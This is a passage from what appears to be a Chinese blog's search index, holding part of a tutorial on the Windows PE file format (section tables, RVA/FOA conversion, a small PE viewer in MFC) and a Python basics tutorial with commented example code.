ThreadDetach!\\r\\n&quot;);\n\treturn;\n&#125;\n\n&#x2F;*\n* 注册TLS回调函数，&quot;.CRT$XLB&quot;的含义是：\n* CRT表明使用C RunTime机制\n* X表示标识名随机\n* L表示TLS callback section\n* B其实也可以为B-Y的任意一个字母\n*&#x2F;\n#pragma data_seg(&quot;.CRT$XLB&quot;)\nPIMAGE_TLS_CALLBACK p_thread_callback[] &#x3D; &#123;\n\tt_TlsCallBack_A,\n\tt_TlsCallBack_B,\n\tNULL &#125;;\n#pragma data_seg()\n\nDWORD WINAPI t_ThreadFun(PVOID pParam) &#123;\n\t\n\tprintf(&quot;%p  &quot;, &amp;g_nNum1);\n\tprintf(&quot;%p\\n&quot;, &amp;g_nNum2);\n\treturn 0;\n&#125;\n\nint main()\n&#123;\n\tprintf(&quot;%p  &quot;, &amp;g_nNum1);\n\tprintf(&quot;%p\\n&quot;, &amp;g_nNum2);\n\tHANDLE hThread &#x3D; CreateThread(NULL, 0, t_ThreadFun, NULL, 0, 0);\n\tWaitForSingleObject(hThread, -1);\n\treturn 0;\n&#125;\n\n区段表结构体数组数组的元素个数由文件头中的NumberOfSection决定。\nC++\ntypedef struct _IMAGE_SECTION_HEADER &#123;\n    BYTE    Name[0x8];\t                       &#x2F;&#x2F; (1) 区段名\n    union &#123;\n            DWORD   PhysicalAddress; \n            DWORD   VirtualSize;                  &#x2F;&#x2F; (2) *区段大小\n &#125; Misc;\t\t\t\t\t\n    DWORD   VirtualAddress;\t\t&#x2F;&#x2F; (3)区段的RVA地址*\n    DWORD   SizeOfRawData;\t\t&#x2F;&#x2F; (4) 文件中的区段对齐大小*\n    DWORD   PointerToRawData;\t\t&#x2F;&#x2F; (5) 区段在文件中的偏移*\n    DWORD   PointerToRelocations;\t&#x2F;&#x2F; (6) 重定位的偏移（OBJ）\n    DWORD   PointerToLinenumbers;\t&#x2F;&#x2F; (7) 行号表的偏移（调试）\n    WORD    NumberOfRelocations;\t&#x2F;&#x2F; (8) 重定位项数量（OBJ）\n    WORD    NumberOfLinenumbers;\t&#x2F;&#x2F; (9) 行号表项数量\n    DWORD   Characteristics;\t\t&#x2F;&#x2F; (10) 区段的属性\n&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;\n\n怎么找到区段表宏：IMAGE_FIRST_SECTION(NT头的地址)\n计算：NT头的地址+0x4+0x14+0xE0\n&#x2F;&#x2F;打开PE文件后，第一个段就是DOS头部\nPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n&#x2F;&#x2F;pDos的e_lfanew字段可以指向NT头的空间，使用NT头接收\nPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;\n&#x2F;&#x2F;使用IMAGE_FIRST_SECTION这个宏，传图NT头来获取区段表\nPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\n区段表中的一个元素描述的就是一个区段的信息1 Name：区段名\n2 PointerToRawData 在文件中的位置 FOA\n3 SizeOfRawData在文件中的大小\n4 VirtualAddress在内存中的位置 RVA\n5 Misc.VirtualSize:在内存中的大小\n6 Characteristics:区段的属性：可读 可写 可执行。。。。\n区段表中的以下四个字段保存的是什么？VirtualAddress： 区段起始位置的RVA\nPointerToRawData： 区段在文件中的起始偏移\nVirtualSize： 区段在内存中的大小（没有对齐）\nSizeOfRawData： 区段在文件中的大小（对齐过的）\n是否VirtualSize 一定会小于SizeOfRawData？\n不是的，有可能是这个区段在文件中没有数据，运行起来之后，才有数据。\n测试代码C++\n#include &lt;Windows.h&gt;\nvoid AnalyzeNTHeader(char* lpImage)\n&#123;\n\t&#x2F;&#x2F;1 找到NT头\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n    PIMAGE_FILE_HEADER pFileHeader &#x3D; &amp;pNt-&gt;FileHeader;\n    PIMAGE_OPTIONAL_HEADER pOption &#x3D; &amp;pNt-&gt;OptionalHeader;\n\t&#x2F;&#x2F;2 开始解析文件头\n\tprintf(&quot;运行平台:%x\\n&quot;,pFileHeader-&gt;Machine);\n\tprintf(&quot;区段数量:%x\\n&quot;, pFileHeader-&gt;NumberOfSections);\n\tprintf(&quot;扩展头大小:%x\\n&quot;, pFileHeader-&gt;SizeOfOptionalHeader);\n\tprintf(&quot;时间戳:%x\\n&quot;, pFileHeader-&gt;TimeDateStamp);\n\tprintf(&quot;属性:%x\\n&quot;, pFileHeader-&gt;Characteristics);\n\t&#x2F;&#x2F;3 解析扩展头\n\t&#x2F;&#x2F;。。。\n&#125;\nvoid AnalyzeSectionTable(char* lpImage)\n&#123;\n\t&#x2F;&#x2F;1 获取区段表的起始位置\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\t&#x2F;&#x2F;2 解析\n\tfor (int  i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tprintf(&quot;区段名：%s\\t&quot;, pHeader[i].Name);\n\t\tprintf(&quot;内存中大小：%X\\t&quot;, pHeader[i].Misc.VirtualSize);\n\t\tprintf(&quot;内存中RVA：%X\\t&quot;, pHeader[i].VirtualAddress);\n\t\tprintf(&quot;文件中大小：%X\\t&quot;, pHeader[i].SizeOfRawData);\n\t\tprintf(&quot;文件中FOA：%X\\t&quot;, pHeader[i].PointerToRawData);\n\t\tprintf(&quot;属性：%X\\t&quot;, pHeader[i].Characteristics);\n\t\tprintf(&quot;\\n&quot;);\n\t&#125;\n&#125;\n\nRVA和FOA之间的转换文件偏移（FOA或者Offset）： 某一个数据距离文件开头的偏移\nRVA怎么转换成FOARVA - RVA区段 &#x3D; FOA -FOA区段\nFOA &#x3D; RVA - RVA区段+FOA区段\n一般情况下，PE文件的头部在文件中是多大？0x400\nPE文件的头部在内存中是多大0x1000\nRVA为0x600的时候，转为FOA 转不了，在文件中没有对应的位置\n虚拟地址（VA）：程序在运行的时候，是将PE文件加载到进程的内存空间中。进程的这块内存空间就称之为 虚拟内存空间 32位程序虚拟内存空间是以字节为单位的，每一个字节都有一个编号从0x0000 0000到0xFFFFFFFF之间。这些编号就是虚拟地址。\n相对虚拟地址（RVA）：PE文件不会占满整个虚拟内存空间，而是会占用一部分。那么就会有一个起始位置，这个起始位置也成为加载基址。PE文件中的数据相对于加载基址的偏移就是相对虚拟地址。\n如果系统加载PE文件的时候，是将PE文件原封不动的复制到了内存中，那么某一个数据的FOA和RVA就是相等的。\n但是现实情况并非如此，系统加载PE文件到内存的之后，PE文件是被扩展了的。\nDWORD RvaToFoa(char* lpImage,DWORD dwRva)\n&#123;\n\t&#x2F;&#x2F;1 获取区段表的起始位置\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\t\n\tif (dwRva&lt; pNt-&gt;OptionalHeader.SizeOfHeaders)\n\t&#123;\n\t\treturn dwRva;\n\t&#125;\n\t&#x2F;&#x2F;2 循环判断RVA落在了哪个区段中\n\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tDWORD dwSectionRva &#x3D;  pHeader[i].VirtualAddress;\n\t\tDWORD dwSectionEndRva &#x3D; dwSectionRva + pHeader[i].SizeOfRawData;\n\t\tDWORD dwSectionFOA &#x3D; pHeader[i].PointerToRawData;\n\t\tif (dwRva&gt;&#x3D; dwSectionRva &amp;&amp;dwRva&lt;&#x3D; dwSectionEndRva)\n\t\t&#123;\n\t\t\tpHeader[i].VirtualAddress;\n\t\t\tDWORD dwFOA &#x3D; dwRva - dwSectionRva+ dwSectionFOA;\n\t\t\treturn dwFOA;\n\t\t&#125;\n\t&#125;\n\treturn -1;\n&#125;\n\n小功能的实现位置计算&#x2F;&#x2F;位置计算器按钮\nvoid CPEDlg::OnBnClickedButton2()\n&#123;\n\tUpdateData(TRUE);\n\tif (m_strEditTest1 !&#x3D; L&quot;&quot;)\n\t&#123;\n\t\tCMGpsCalcDlg* pPrcPopDg &#x3D; new CMGpsCalcDlg;\n\n\t\tpPrcPopDg-&gt;Create(IDD_DIALOG1, this);\n\t\tpPrcPopDg-&gt;ShowWindow(SW_SHOW);\n\t\tpPrcPopDg-&gt;GetPath(buf);\n\t&#125;\n\n&#125;\n\nvoid CMGpsCalcDlg::RvaToFoa()\n&#123;\n\tUpdateData(TRUE);\n\t\n\tCString svPid &#x3D; m_strEditRva.GetString();\n\tDWORD dwRva &#x3D; _tcstoul(svPid, NULL, 16);\n\t\n\t\n\t\n\t&#x2F;&#x2F;1 获取区段表的起始位置\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)buf;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + buf);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\tPIMAGE_OPTIONAL_HEADER pOption &#x3D; &amp;pNt-&gt;OptionalHeader;\n\n\tif (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)\n\t&#123;\n\t\tCString cd;\n\t\tcd.Format(L&quot;%x&quot;, dwRva);\n\t\tm_strEditFoa.SetString(cd);\n\t\tUpdateData(FALSE);\n\t\treturn;\n\t&#125;\n\t&#x2F;&#x2F;2 循环判断RVA落在了哪个区段中\n\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tDWORD dwSectionRva &#x3D; pHeader[i].VirtualAddress;\n\t\tDWORD dwSectionEndRva &#x3D; dwSectionRva + pHeader[i].SizeOfRawData;\n\t\tDWORD dwSectionFOA &#x3D; pHeader[i].PointerToRawData;\n\t\tif (dwRva &gt;&#x3D; dwSectionRva &amp;&amp; dwRva &lt;&#x3D; dwSectionEndRva)\n\t\t&#123;\n\t\t\tpHeader[i].VirtualAddress;\n\t\t\t\n\t\t\t&#x2F;&#x2F;FOA\t\t&#x3D; RVA   - RVA区段\t   + FOA区段\n\t\t\tDWORD dwFOA &#x3D; dwRva - dwSectionRva + dwSectionFOA;\n\t\t\tCString foa;\n\t\t\tfoa.Format(L&quot;%x&quot;,dwFOA);\n\t\t\tm_strEditFoa.SetString(foa);\n\n\t\t\t&#x2F;&#x2F;va虚拟地址&#x3D; InmageBase(加载基址) + RVA(相对虚拟地址)\n\t\t\tDWORD dwVA &#x3D; pOption-&gt;ImageBase + dwRva;\n\t\t\tCString va;\n\t\t\tva.Format(L&quot;%x&quot;, dwVA);\n\t\t\tm_strEditVa.SetString(va);\n\n\t\t\t&#x2F;&#x2F;区段名\n\t\t\tCString name;\n\t\t\tname.Format(L&quot;%S&quot;, pHeader[i].Name);\n\t\t\tm_strEditName.SetString(name);\n\n\t\t\tUpdateData(FALSE);\n\t\t\treturn;\n\t\t&#125;\n\t&#125;\n\tMessageBox(L&quot;不存在该地址&quot;);\n&#125;\n\n响应拖拽&#x2F;&#x2F;响应文件拖拽\nvoid CPEDlg::OnDropFiles(HDROP hDropInfo)\n&#123;\n\n\t&#x2F;&#x2F; 存放文件路径\n\twchar_t filePath[MAX_PATH] &#x3D; &#123;&#125;;\n\n\t&#x2F;&#x2F; 获取拖拽文件的路径\n\tDragQueryFile(hDropInfo, 0, filePath, MAX_PATH);\n\n\t&#x2F;&#x2F; 更新变量\n\tm_strEditPath &#x3D; filePath;\n\tUpdateData(FALSE);\n\n\tCDialogEx::OnDropFiles(hDropInfo);\n&#125;\n\n时间换算&#x2F;&#x2F;时间转换\nvoid CPEDlg::OnBnClickedButton3()\n&#123;\n\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)buf;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + buf);\n\tPIMAGE_FILE_HEADER pFileHeader &#x3D; &amp;pNt-&gt;FileHeader;&#x2F;&#x2F;NT头\n\t\n\tstruct tm* p;\n\n\ttime_t t &#x3D;pFileHeader-&gt;TimeDateStamp;\n\tp &#x3D; localtime(&amp;t);\n\tCString Time;\n\tTime.Format(L&quot;%d年%d月%d日%d时%d分%d秒&quot;, 1900 + p-&gt;tm_year, 1 + p-&gt;tm_mon, p-&gt;tm_mday, p-&gt;tm_hour, p-&gt;tm_min, p-&gt;tm_sec);\n\tMessageBox(Time);\n&#125;\n\nPE文件结构图\n\n","slug":"PE文件结构","date":"2020-11-24T06:55:09.000Z","categories_index":"Windows安全","tags_index":"PE文件结构","author_index":"Akpigs"},{"id":"6b3d24a06c11d699c5c6879ddbf2363d","title":"python基础","content":"\n\n\n\n\n\n\n\n\n旅行者,本破站点旨在原创文章记录学习经历&amp;&amp;收集优秀资源减少学习成本，如果您又更好的想法请联系我。让我们一起传承开源精神🤓……\n数值类型\n\n\n类型\n关键字\n数据\n\n\n\n整型\nint\n整数，无限\n\n\n浮点型\nfloat\n小数\n\n\n复数\ncomplex\n复数由实数部分和虚数部分构成\n\n\n关键字\n\n\n算术\n引入\n异常\n控制\n操作与状态\n返回退出\n定义\n\n\n\nand\nimport\nexcept\nwhile\ndel\nreturn\nlambda\n\n\nor\nas\ntry\nif\nassert\nyield\nclass\n\n\nin\nfrom\nfinally\nelse\nTrue\ncontinue\nglobal\n\n\nis\n\nraise\nelif\nFalse\npass\ndef\n\n\nnot\n\nwith\nfor\nNone\nbreak\nnonlacal\n\n\n基础操作与使用输入Python\n# 通过 input 可以直接完成一个交互式的输入\nvalue &#x3D; input(&#39;请输入一个整数: &#39;)\n\n# 输入的任何数据最终都会是一个字符串\nprint(value, type(value))\n\n# 通过强制类型转换或 eval 函数可以转换类型\nvalue &#x3D; int(input(&#39;请输入第二个数: &#39;))\nprint(value, type(value))\n\n输出Python\n# 使用 print 进行内容的输出，可以输出不定长度不定类型的值\nprint(1, &#39;1&#39;, 1.1, [1, ], (1, ))\n\n# 在使用 print 进行输出的时候，通过参数可以指定一些格式\nprint(1, 2, 3, 4, 5, 6, sep&#x3D;&#39;*&#39;, end&#x3D;&#39;这里是结尾&#39;)\n\n# 格式化输出，使用 % 进行格式化输出，字符串语法支持\nprint(&#39;%5.2f + %d &#x3D; %d&#39; % (1, 2, 1+2))\n\n# 格式化输出，使用字符串的内置方法 format，字符串内置方法\nprint(&#39;&#123;0:.3f&#125;, &#123;1:10d&#125;, &#123;0:.3f&#125;&#39;.format(1, 2))\n\n# 格式化输出，使用 f&#39;&#39; 字符串进行输出，语法支持\nprint(f&#39;&#123;1:.2f&#125; + &#123;2&#125; &#x3D; &#123;1+2&#125;&#39;)\n\n函数的定义Python\n# 函数定义的简单例子\ndef my_max(value1&#x3D;0, value2&#x3D;0):\n    # 类似三目运算符的写法\n    return value1 if value1 &gt; value2 else value2\n\n\n# 新的写法，可以限制传入的类型\ndef my_min(value1: int, value2: int) -&gt; int:\n    return value1 if value1 &gt; value2 else value2\n\n\n# pass 类似于 C 语言中的单个分号，即什么也不做，如果一个\n# 函数没有显示的指定返回值，那么就返回 None\ndef no_return():\n    pass\n\n\nprint(no_return())\n\n\n# 参数的传递: 位置传参，按照定义顺序传参\nprint(my_min(10, 20))\n\n# 参数的传递: 关键字传参，按照形参名传参(很常见)\nprint(my_min(value2&#x3D;10, value1&#x3D;20))\n\n运算符的使用Python\n# 算数运算符: 幂运算 **\nprint(2 ** 1024)\n\n# 算数运算符: 除法运算 &#x2F;(真除法) &#x2F;&#x2F;(向下取整除法)\nprint(10 &#x2F; 10, 10.0 &#x2F; 3)\nprint(10 &#x2F;&#x2F; 3, -10.0 &#x2F;&#x2F; 3)\n\n# 比较运算 &#x3D;&#x3D; 和身份运算符 is\nl1 &#x3D; [1, 2, 3]\nl2 &#x3D; l1\nprint(hex(id(l1)), hex(id(l2)), l1 &#x3D;&#x3D; l2, l1 is l2)\nl2 &#x3D; l1.copy()\nprint(hex(id(l1)), hex(id(l2)), l1 &#x3D;&#x3D; l2, l1 is l2)\n\n# 成员关系运算符: 判断某元素是否在某容器中\nprint(&#39;a&#39; in &#39;abc&#39;, &#39;d&#39; in &#39;abc&#39;)\n\n选择结构Python\n# 判断用户输入的用户名和密码是否符合长度且匹配\n\n# 接收用户的输入\nusername &#x3D; input(&#39;username: &#39;)\npassword &#x3D; input(&#39;password: &#39;)\n\n# 判断用户输入的长度是否准确\nif len(username) &gt;&#x3D; 8 and len(password) &gt;&#x3D; 8:\n    # if 后面直接添加表达式，结尾必须添加冒号(:)\n    if username &#x3D;&#x3D; &#39;username&#39; and password &#x3D;&#x3D; &#39;password&#39;:\n        # if 后面的语句必须拥有一级缩进，并且所有存在一级缩进\n        # 的语句都被认为是语句块的一部分，累哦四花括号作用域\n        print(&#39;登录成功，跳转至个人中心...&#39;)\n        print(&#39;这里是第二条语句，同样是输出的&#39;)\nelse:\n    print(&#39;用户名或密码的长度不够&#39;)\n\n列表Python\n# 列表的基础知识: 内置的序列类型，可以看作是加强版本的数，通过中括号\n# [] 进行定义，其中不要求元素的类型是一致的，并且长度是可变的\nprint([1, 2, 3, 4, 5], type([]))\nprint([1, 1.1, &#39;1&#39;, [1]])\n\n# 算数运算\nprint([1] + [2])        # 将参与运算的列表组合成新的列表\nprint([1, 2] * 3)       # 将列表的元素重复 3 次\nprint(3 in [0, 1, 2])   # 判断是否在列表中\nprint([1, 2, 3] &#x3D;&#x3D; [3, 2, 1])   # 比较运算符\n\n# 全局函数\nprint(len([1, 2, 3]))\nprint(min([1, 2, 3]))\nprint(max([1, 2, 3]))\nprint(list(reversed([1, 2, 3])))\nprint(list(sorted([1, 2, 3])))\n\n# 内置方法\nl &#x3D; [1, 2, 3, 4, 5]\nl.append(6)\nprint(l)        # 在结尾添加元素\nl.insert(0, 0)\nprint(l)        # 在指定位置添加\nl.remove(3)\nprint(l)        # 删除某元素(元素)\nl.pop(0)\nprint(l)        # 删除某元素(索引)，返回删除的内容\nl.extend([1,2,3,4])\nprint(l)        # 类似列表的加法运算符\n\n# 切片操作(序列操作)  l[a:b:c]\nl &#x3D; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nprint(l[:3], l[:4])         # [起始位置, 结束的索引(不包含)]\nprint(l[3:], l[4:])         # [起始的索引(包含), 结束位置]\nprint(l[::2], l[::3])       # [::间隔的个数(步长)]\nprint(l[:-1])               # [:负数] 倒数第n个的前一个\nprint(l[::-1])              # [::负数] 逆序开始计算步数\nprint(l[1:7:3])             # 从下标 1 开始，到下标 7 的前一个，每次遍历+3\n\n# 元组类型: 可以看作不变的列表，操作方式类似列表，使用 , 定义\nprint((1,), type((1,)))\n\n# 元组的打包和解包(打包)\nt &#x3D; 1, 2, 3, 4, 5\n# 元组的打包和解包(解包): 解包的过程中前面的变量数量和元组的元素数量必须保持一致\na, b, c, d, e &#x3D; t\n\n# 元组打包解包的例子\na &#x3D; 1\nb &#x3D; 2\n# 将 b 和 a 的值，也就是 2 和 1 打包成一个临时的元组，\n# 然后进行解包，将 2 和 1 分别赋值给对应位置的 a 和 b\na, b &#x3D; b, a\n\n\n# 打包可以让函数返回多个参数，解包可以接收多个参数\ndef return_more():\n    return 1, 2, 3\n\n\n# 通过解包接收到了多个返回值\nvalue1, value2, value3 &#x3D; return_more()\n\n字典Python\n# 字典存储的是键值对，可以通过 &#123;&#125;的方式定义字典\nprint(&#123;&#39;1&#39;: 1, &#39;2&#39;: 2, &#39;3&#39;: 3&#125;, &#123;&#125;)\n\nd &#x3D; dict()\n# 通过索引添加键来访问对应的值，第一次赋值时会添加，接下来的操作就是修改\nd[&#39;小明&#39;] &#x3D; 99\nprint(d)            # 添加\nd[&#39;小明&#39;] &#x3D; 0\nprint(d)            # 修改\ndel d[&#39;小明&#39;]\nprint(d)            # 删除\n\n# 不能访问不存在的键，在使用前通常会判断是否拥有键\nif &#39;小明&#39; in d:\n    print(d[&#39;小明&#39;])\n\n# 可变类型，元素可以被修改的类型: list dict set\n# 不可变类型，元素不可以被修改的类型: int float bool str tuple\n\n# 字典的键必须时不可变类型\nd &#x3D; &#123;1: 1, &#39;1&#39;: 1, True: 1, 1.1: 1, (1,): 1&#125;\n\n# 用于获取到字典内的一些信息\nprint(d.items())\nprint(d.values())\nprint(d.keys())\n\n\n# 集合类型: 通过 &#123;值，值，值&#125; 定义非空集合，空集合使用set()定义\n#   set 要求所有的数据必须时常量，且唯一\nprint(&#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 8, 7, 6, 5, 4, 3, 2, 1&#125;)\n\n# 可以通过集合来保存一些唯一的数据\nprint(list(set([1, 2, 3, 4, 5, 6, 7, 8])))\n\n# 集合可以用于执行数学运算中的集合运算   | ^ - +\n\n深拷贝与浅拷贝Python\nl1 &#x3D; [1, 2, 3, 4, 5, 6, 7, 8, 9]\n\n# 对列表进行赋值操作，执行的实际是浅拷贝\nl2 &#x3D; l1\nprint(hex(id(l1)), hex(id(l2)))\n\n# 如果是浅拷贝，两个变量指向同一个地址，一方更改，另一方也受影响\nl2[0] &#x3D; 10\nprint(l1, l2)\n\nl1 &#x3D; [1, 2, 3, 4, 5, 6, 7, 8, 9]\n\n# 通过 copy 方法进行深拷贝\nl2 &#x3D; l1.copy()\nprint(hex(id(l1)), hex(id(l2)))\n\n# 拥有各自独立的空间，不会影响另外一个\nl2[0] &#x3D; 10\nprint(l1, l2)\n\n\n# 动态类型: 类型在运行过程中确定，可以改变，一般不用在定义(如果有定义)时指定类型\n# 静态类型: 类型在编译时确定，运行期间不变，始终保存定义时所提供的类型\n\n# 强类型： 不同类型的变量，所能够执行的操作是不同的，例如整数相乘是乘法，字符串乘法是重复\n# 弱类型： 运算不考虑类型，可以为任何类型提供计算\n\nwhile循环Python\n# 循环，使用 while 编写循环语句，和 C 相同\n\nnumber &#x3D; 1\nwhile number &lt;&#x3D; 100:\n    print(number, end&#x3D;&#39; &#39;)\n    number +&#x3D; 1\nprint(&#39;&#39;)\n\n# for 语句的使用: 可以用于遍历所有的可迭代类型，每次循环从序列中获取第(循环次数)个的元素，\n# 将元素赋值给 for 和 in 中间所提供的变量中，可以被直接的访问到\nfor letter in &#39;hello 15pb&#39;:\n    print(letter)\n\n# 使用 range 可以快速生成一个指定规则的列表，参数同切片\nprint(list(range(1, 100, 3)))\n\n# 通过 range 生成一个可迭代序列，从中取出元素，并输出\nfor value in range(101):\n    print(value)\n\n\n# while 一般用于不确定的循环，for 一般用于序列的遍历\n# break 和 continue 和 C++ 的完全一致，对于break，for 和 while 有扩展语法\n\nfor i in range(100):\n    # 对于 for else 或者 while else 语句，如果采用 break 跳出\n    # 循环就不执行 else，如果正常退出则执行\n    pass\nelse:\n    print(&#39;正常退出&#39;)\n\nfor循环Python\nl &#x3D; [1, 2, 3, 4, 5, 6, 7, 8, 9]\n\n# 使用 for 遍历的几种方式: 值的遍历\nfor item in l:\n    print(item, end&#x3D;&#39; &#39;)\nprint(&#39;&#39;)\n\n# 使用下标的方式进行遍历\nfor index in range(len(l)):\n    print(f&#39;l[&#123;index&#125;]&#x3D;&#123;l[index]&#125;&#39;, end&#x3D;&#39; &#39;)\nprint(&#39;&#39;)\n\n# 通过枚举的方式进行索引\nfor index, item in enumerate(l):\n    print(f&#39;l[&#123;index&#125;]&#x3D;&#123;item&#125;&#39;, end&#x3D;&#39; &#39;)\nprint(&#39;&#39;)\n\nd &#x3D; &#123;&#39;小明&#39;: 100, &quot;小红&quot;: 101, &#39;小刚&#39;: 99&#125;\n\n# 字典的遍历方式: 键，默认使用字典名就是 keys\nfor key in d.keys():\n    print(f&#39;d[&#123;key&#125;]&#x3D;&#123;d[key]&#125;&#39;, end&#x3D;&#39; &#39;)\nprint(&#39;&#39;)\n\n# 字典的遍历方式: 值\nfor value in d.values():\n    print(f&#39;&#123;value&#125;&#39;, end&#x3D;&#39; &#39;)\nprint(&#39;&#39;)\n\n# 字典的遍历方式: 键值对\nfor key, value in d.items():\n    print(f&#39;d[&#123;key&#125;]&#x3D;&#123;value&#125;&#39;, end&#x3D;&#39; &#39;)\nprint(&#39;&#39;)\n\n生成式Python\n# 列表生成式: 快速生成列表\nprint([i for i in range(1000)])                         # 生成指定序列\nprint([i for i in range(1000) if i % 2 &#x3D;&#x3D; 0])           # 生成指定序列 + 判断\nprint([i**2 for i in range(1000) if i % 2 &#x3D;&#x3D; 0])        # 生成指定序列 + 判断 + 表达式\nprint([i*j for i in range(1, 10) for j in range(1, 10)])\n\nimport os\ndir_base &#x3D; r&#39;D:\\Microsoft\\Visual Studio 2019\\Common7\\IDE\\\\&#39;\nprint([os.path.splitext(path) for path in os.listdir(dir_base) if os.path.isfile(dir_base+path)])\n\n# 元组生成式，改成圆括号\n# 字典生成式，改成键值对的花括号\n# 集合生成式，改成花括号\n\nglobal关键字Python\n# 全局变量: 定义在所有函数之外的变量\ng_number &#x3D; 0\n\n\n# 局部变量: 定义在任何一个函数之内的变量\ndef function1():\n    l_number &#x3D; 1\n    # 分别用于输出当前的全局变量以及所在作用域的局部变量\n    print(globals(), locals())\n\n\nfunction1()\n\n\n# 尝试在函数中访问一个全局变量\ndef function2():\n    # 在局部空间中可以直接访问全局变量\n    print(g_number)\n\n\nfunction2()\n\n\ndef function3():\n    # 一旦尝试在函数内修改全局变量，实际上会定义出一个\n    # 和全局变量同名的局部变量\n    g_number &#x3D; 10000\n    print(locals(), globals())\n\n\nfunction3()\n\n\ndef function4():\n    # 通过 global 关键字，可以声明使用的是全局范围内的 g_number\n    global g_number\n    g_number &#x3D; 100000000\n    print(locals(), globals())\n\n\nfunction4()\n\n\ndef function5():\n    # 如果想在函数内定义一个全局变量，也可以使用 global\n    global g_value2\n    g_value2 &#x3D; 0x12345\n    print(locals(), globals())\n\n\nfunction5()\n\n模块Python\n# 任何一个以 .py 结尾的文件，都被成为模块，可以使用 import 语句导入\n# 导入的时候首先需要找到目标模块，接下来将目标模块转换成字节码，使用\n# PVM执行字节码，由于这是一个十分消耗性能的事情，所以 python 只允许\n# 我们对一个模块直接进行一次导入\nimport module\nimport module\n\n# 如果一定想要代码被执行多遍，可以使用内置模块 importlib\nimport importlib\nimportlib.reload(module)\n\n# 如何使用模块中的内容（概念类似C++中的头文件和命名空间）\nimport module                       # 类似于 #include &lt;iostream&gt;\nprint(module.module_value1)\n\nfrom module import module_value2    # 类似于在包含头文件的基础上 using std::name\nprint(module_value2)\n\nfrom module import *                # 在包含头文件的基础上 using namespace std\nprint(module_value3)\n\n# 单下划线开头的模块全局变量只能使用命名空间访问\nprint(module._module_private_value)\n\n类的定义Python\n# class 开头后面紧跟类名，类名的首字母应该大写，后面的括号中是父类\n# python3 定义的类称之为新式类，无论是否显式说明父类的 object，默\n# 认都继承自 object，并且继承下来了一些内置的方法\nclass Student(object):\n    # 类内直接定义了一些变量，被称为[类]属性，所有的类属性\n    # 归类所有，能够被任何一个实例访问到，类似于静态变量\n    count &#x3D; 0\n    books &#x3D; []\n\n    # 构造访问，任何一个类都拥有名称为 __init__ 的构造方法，\n    # 当一个实例被创建之后，会被自动的调用\n    def __init__(self, name, age):\n        # 所有使用 self 以及实例名创建的变量都成为实例属性\n        # 每一个实例都拥有自己的实例属性，可以动态添加\n        self.name &#x3D; name\n        self.age &#x3D; age\n        print(&#39;这是一个构造方法&#39;)\n\n    # 任何一个类都拥有名称为 __del__ 的析构方法\n    def __del__(self):\n        print(&#39;这是一个析构方法&#39;)\n\n\n# 如果存在构造方法，那么创建实例的时候，必须提供除\n# self 以外的其它所有参数，self 类似于 this，表示\n# 调用方法的是哪一个实例\nobjStudent1 &#x3D; Student(&quot;xiaoming&quot;, 19)\n\n类属性的使用Python\n# 定义一个类，类内添加了类属性\nclass Demo(object):\n    # 一个类属性\n    class_value &#x3D; 0\n\n\ndemo &#x3D; Demo()\n# 想要访问类属性，可以使用类名以及实例名(不推荐)\nprint(demo.class_value)\nprint(Demo.class_value)\n\n# 对于类属性的修改，\ndemo.class_value &#x3D; 100          # 创建了一个同名的实例属性\nprint(Demo.class_value)\nDemo.class_value &#x3D; 200          # 修改类属性只能使用类名\nprint(Demo.class_value)\n\n# 动态增减类属性的方式\n#   增加: 通过类名或类方法中的 cls 关键字可以动态添加\nDemo.class_value2 &#x3D; 1000\nprint(Demo.__dict__)        # 包含类内所有的属性组合的键值对\n#   删除: 通过关键字 del 进行删除\ndel Demo.class_value\nprint(Demo.__dict__)\n\n实例属性的使用Python\n# 一个类，包含了实例属性的使用\nclass Demo(object):\n\n    # 如果在构造方法内添加实例属性，可以保证每一个实例都拥有\n    def __init__(self, value):\n        self.value &#x3D; value\n\n    # 一个实例方法，其中使用了 self 关键字添加实例属性\n    def add_value(self):\n        self.value1 &#x3D; 0\n\n\n# 创建一个实例(每个实例都有自己的属性)\ndemo1 &#x3D; Demo(1000)\ndemo2 &#x3D; Demo(2000)\n\n# 输出两个实例中的所有元素\nprint(demo1.__dict__)\nprint(demo2.__dict__)\n\n# 通过 self 以及实例名动态的添加属性\ndemo1.add_value()\ndemo2.value2 &#x3D; 1000\nprint(demo1.__dict__)\nprint(demo2.__dict__)\nPython\n# 定义一个空类，用于测试内部属性\nclass 